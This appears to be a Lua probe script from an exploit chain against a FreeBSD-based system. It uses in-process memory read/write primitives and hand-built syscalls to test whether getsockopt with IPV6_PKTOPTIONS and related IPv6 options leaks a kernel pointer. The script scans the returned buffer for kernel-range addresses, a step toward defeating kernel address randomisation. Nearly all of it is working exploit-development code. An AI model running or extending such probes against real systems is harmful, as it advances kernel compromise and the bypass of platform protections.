-- CRASH_CLASS: LOW
-- PROBE 1015a: does IPV6_PKTOPTIONS hand back a cached kernel structure?
--
-- docs/UNTESTED_THEORIES.md:52 lists getsockopt(IPV6_PKTOPTIONS) on a socket that has
-- options set as never measured. FreeBSD caches an `ip6_pktopts` per socket and the
-- loader's own kread layer is built on that object (setsockopt stores a kernel pointer
-- at +0x10 of it). If getsockopt copies the cached structure back, the copy may carry a
-- kernel pointer, which is the leak every syscall survey has failed to produce.
--
-- Every scan prints rv and the first four qwords, so a rejected call cannot be read as
-- "no pointer found".

print("=== PROBE 1015a: IPV6_PKTOPTIONS LEAK ===")
print("")
local function to_num(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    if type(v)=="table" and v.h then return v.h*4294967296+v.l end
    return tonumber(v) or 0
end
local function as_addr(x)
    local m = tostring(x):match("0x(%x+)")
    if m then return tonumber(m,16) end
    return to_num(x)
end
local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local function wq(a,v) pcall(function() memory.write_qword(uint64(a),uint64(v)) end) end
local function rq(a) local o,v=pcall(function() return memory.read_qword(uint64(a)) end) if o then return tostring(v) end return "?" end

local AF_INET6, SOCK_DGRAM, IPPROTO_IPV6 = 28, 2, 41
local IPV6_PKTINFO, IPV6_RECVPKTINFO, IPV6_PKTOPTIONS, IPV6_2292PKTINFO = 46, 49, 57, 19

local sc_sock  = mk(97)
local sc_sset  = mk(105)
local sc_sget  = mk(118)
local sc_close = mk(6)

local function sock()
    local ok, fd = pcall(function() return sc_sock(uint64(AF_INET6), uint64(SOCK_DGRAM), uint64(0)) end)
    if not ok then return -1 end
    return to_num(fd)
end
local function setopt(fd, name, buf, len)
    local ok, rv = pcall(function() return sc_sset(uint64(fd), uint64(IPPROTO_IPV6), uint64(name), uint64(buf), uint64(len)) end)
    return ok and to_num(rv) or -99
end
local function getopt(fd, name, buf, lenp)
    local ok, rv = pcall(function() return sc_sget(uint64(fd), uint64(IPPROTO_IPV6), uint64(name), uint64(buf), uint64(lenp)) end)
    return ok and to_num(rv) or -99
end

local opt = memory.alloc(0x80); local opa = as_addr(opt)
for o=0,0x78,8 do wq(opa+o,0) end
wq(opa, 0)      -- in6_addr ::
wq(opa+16, 1)   -- ifindex 1

local out = memory.alloc(0x400); local oa = as_addr(out)
local lenp = memory.alloc(8);     local la = as_addr(lenp)
local function scrub()
    for o=0,0x3F8,8 do wq(oa+o, 0x4141414141414141) end
    wq(la, 0x400)
end
local function scan(tag, rv)
    local n = to_num(rv)
    if n ~= 0 then
        print(string.format("[%s] rv=%d, buffer not measured (get refused)", tag, n))
        return
    end
    local q1,q2,q3,q4 = rq(oa), rq(oa+8), rq(oa+16), rq(oa+24)
    local hits = 0
    for o=0,0x3F8,8 do
        local s = rq(oa+o)
        local hi = s:match("^0x(%x+)")
        if hi and #hi >= 9 then
            local top = tonumber(hi:sub(1,#hi-8),16)
            if top and top >= 0xFFFF8000 and top ~= 0xFFFFFFFF then
                hits = hits + 1
                print(string.format("   +0x%03X = %s", o, s))
            end
        end
    end
    print(string.format("[%s] rv=%s len=%s hits=%d", tag, tostring(rv), rq(la), hits))
    print(string.format("[%s] first=%s %s %s %s", tag, q1, q2, q3, q4))
end

local fd = sock()
print(string.format("[0] fd=%d", fd))
if fd > 0 then
    local s1 = setopt(fd, IPV6_PKTINFO, opa, 20)
    print(string.format("[1] set PKTINFO rv=%s", tostring(s1)))
    if s1 == 0 then
        scrub()
        local g2 = getopt(fd, IPV6_PKTOPTIONS, oa, la)
        scan("PKTOPTIONS", g2)
    else
        print("[1] set failed, PKTOPTIONS skipped")
    end
    scrub()
    local s3 = setopt(fd, IPV6_2292PKTINFO, opa, 20)
    print(string.format("[3] set 2292PKTINFO rv=%s", tostring(s3)))
    if s3 == 0 then
        scrub()
        local g4 = getopt(fd, IPV6_2292PKTINFO, oa, la)
        scan("2292PKTINFO", g4)
    end
    scrub()
    local g5 = getopt(fd, IPV6_RECVPKTINFO, oa, la)
    scan("RECVPKTINFO", g5)
    pcall(function() return sc_close(uint64(fd)) end)
end
print(string.format("[6] alive pid=%u", to_num(mk(20)())))
print("=== COMPLETE ===")
